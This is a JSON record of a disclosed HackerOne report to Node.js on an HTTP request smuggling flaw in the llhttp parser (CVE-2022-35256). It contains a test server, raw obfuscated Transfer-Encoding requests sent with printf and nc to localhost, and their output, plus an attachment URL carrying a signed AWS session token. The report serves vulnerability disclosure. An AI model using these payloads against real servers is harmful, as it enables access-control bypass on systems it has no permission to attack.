{
  "id": 1675191,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjc1MTkx",
  "url": "https://hackerone.com/reports/1675191",
  "title": "HTTP Request Smuggling Due to Incorrect Parsing of Header Fields",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-08-20T03:13:30.448Z",
  "submitted_at": "2022-08-20T03:13:30.523Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vvx7",
    "url": "/vvx7",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/bbv64gp7idz3ugwd7gidfhbjqds2/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-35256"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-10-26T08:17:59.080Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2022-09-26T08:17:52.067Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** \nThe `llhttp` parser in the `http` module in Node v18.7.0 does not correctly handle header fields that are not terminated with CLRF. This may result in HTTP Request Smuggling.\n\n**Description:** \nThe following chunked request is processed.  It should be rejected as `Transfer-Encoding` header obfuscation may result in HRS when the upstream proxy does not process the `Transfer-Encoding` header.\n\nA header that precedes the `Transfer-Encoding`, contains an empty value, and is not properly delimited with CLRF may be used for TE obfuscation. \n```\nPOST / HTTP/1.1\nHost: localhost:5000\nx:\\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n```\n\nThe request is rejected when the preceding header has a value but improper CLRF.\n```\nPOST / HTTP/1.1\nHost: localhost:5000\nx:x\\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n```\n\n## Steps To Reproduce:\n\nServer\nRun the server: `node app.js`\n\n```js\n// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/\nconst http = require('http');\n\nhttp.createServer((request, response) => {\n  let body = [];\n  request.on('error', (err) => {\n    response.end(\"Request Error: \" + err)\n  }).on('data', (chunk) => {\n        body.push(chunk);\n  }).on('end', () => {\n    body = Buffer.concat(body).toString();\n\n    // log the body to stdout to catch the smuggled request\n    console.log(\"Response\");\n    console.log(request.headers);\n    console.log(body);\n    console.log(\"---\");\n\n    response.on('error', (err) => {\n      // log the body to stdout to catch the smuggled request\n        response.end(\"Response Error: \" + err)\n    });\n\n    response.end(\"Body length: \" + body.length.toString() + \" Body: \" + body);\n  });\n}).listen(5000);\n```\nPayload\n```bash\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\" x:\\nTransfer-Encoding: chunked\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\" | nc localhost 5000\n```\nOutput\n```\nHTTP/1.1 200 OK\nDate: Sat, 20 Aug 2022 02:59:38 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 22\n\nBody length: 1 Body: A\n```\nNote:\n```bash\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\" Transfer-Encoding: yeet\\r\\n\"\\\n\" Transfer-Encoding: \\n\"\\\n\" Transfer-Encoding: chunked\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\" | nc localhost 5000\n```\nThis also works with the resulting wonky header:\n```\nHTTP/1.1 200 OK\nDate: Sat, 20 Aug 2022 03:06:09 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 22\n\nBody length: 1 Body: A\nResponse\n{ host: 'localhost:5000', 'transfer-encoding': 'yeet, , chunked' }\nA\n```\n\n## Impact:\n\nHRS can lead to access control bypass and other issues.\n\n## Supporting Material/References:\n{F1875064}\n\n\nhttps://hackerone.com/reports/1501679\nhttps://hackerone.com/reports/1238709\n\n## Impact\n\nHTTP Request Smuggling can lead to access control bypass.",
  "weakness": {
    "id": 86,
    "name": "HTTP Request Smuggling"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1875062,
      "file_name": "CleanShot_2022-08-19_at_23.09.24.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/85anhamky7182hac48d4ssjopg7m?response-content-disposition=attachment%3B%20filename%3D%22CleanShot_2022-08-19_at_23.09.24.png%22%3B%20filename%2A%3DUTF-8%27%27CleanShot_2022-08-19_at_23.09.24.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGD4AUG7%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142929Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDpFrYOsYB5%2FZnNgefzkV44NzOEteiLNr5fTaq13l6JbwIhAOtMLRNQibBBBQxVAxTqTJbMe1i9E5%2B1umZpNEn1KLyWKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgyMBkX2hVh%2BhOexaD0qjwWIVul16aokM%2B%2Bk3syXpumdmzjMxBJZIlILTLHDJJHPrp2ZulcJH5q8hr9%2Bpzae%2FyLNUn3QxArdyG9%2Bs%2FxGCEp4uZNVh%2BRETskKt1TTkBBRYx15m1k85ya0qUhv5MdFnIOgnN%2BUWZz1KczjvI%2F9gU0cFH5qy0jkk0I0a6XKsrqTyUBwjrz3RWZzAEvvKYZjHVOrSfeF4C%2BLkz%2BCi%2B7CB11hXtvApsy6s5ePqH91wth7AZHeZAfYwp4Jnbh1p8KmbK30Q47o97dgiNK9E0ES5ZpULPKTxo%2FhRByGRQHuR396JknClT4rG1WurwWjsEx1iTWp3%2BIyTzoS79dILDtAL%2F4k6kS82%2BTv041OCmlhT2B%2Ft31QPcmKZ6jmLgkpliqLSmJDm90SuNY88u223KuIbsJpgJHAObccd017eHct%2FkVwHEB%2BWYeet8ZAMA08ytFzqBv2hcgKOkqLW5Es9oxAzTSbck%2BQRB6jSoC0NgXimudsmbneFbg7yF0Y4IBopwxKtxzDjFFgbqtU9cifZxLTARKETqFVYNINfaUl1vUUUvvkTDk0CNMbrAubZXn7s0fQcUJiBZyRPwXoLHa175h9cNhBU%2FOLVWTdnO4PBAbW3lSNaGkkw83zfmu4x1evle4xFNUDEFXt%2FCNtrb5Xuz1UPtXUEMIsbJZyfLVfMsZqnXu3XD%2BgaLXVFeOtUZvtS%2BIOszbnbTkQRmQ1C%2BxZYiTZYZZuq2Txxz0OVd%2FxefqHFQPV1seIRusOsVC4oy1XhH0CCINVqoCeaTiePOtTAuKY03KLGUc6WfkNBXO%2BiVaNwyTB8btNWytKGGVTY2wswL4EamHwyISg4jCGjpNEMarw6vV5fAIj9BUCtLwnocnN45LiMPXura4GOrABXhfw1V%2BVbu3djc3Jv5AaOf2JhHj80K2MUdzk1WSbySNmDeWK9ok%2FYyzcrq0MY0OW%2Bl8NMAkgeiT3MzBHvXRej72j35zM40rM4yOAw%2BPSNL4BdRz0Hdu5xBbq9Ne4xLyjRbZ4%2FFXajcCr8XcRm47GzUGEyrM2FhYCbhQkAe3yQa%2FttcE2P8mDMzi6ernjG0nfaKdYSIZw8giUSplPOv6L5R2e48BOSJBGCcNI6hcDZtM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2b7441b925c6274bd99d262842ce1d502f81d8c1219e9cd73f9bae461917e959",
      "file_size": 195811,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2022-10-26T08:17:52.185Z",
  "allow_singular_disclosure_after": -41062297.702157885,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "shreyaschavhan",
    "htp24x7",
    "shivammusic",
    "cyb3rkid4u",
    "azdpsi"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
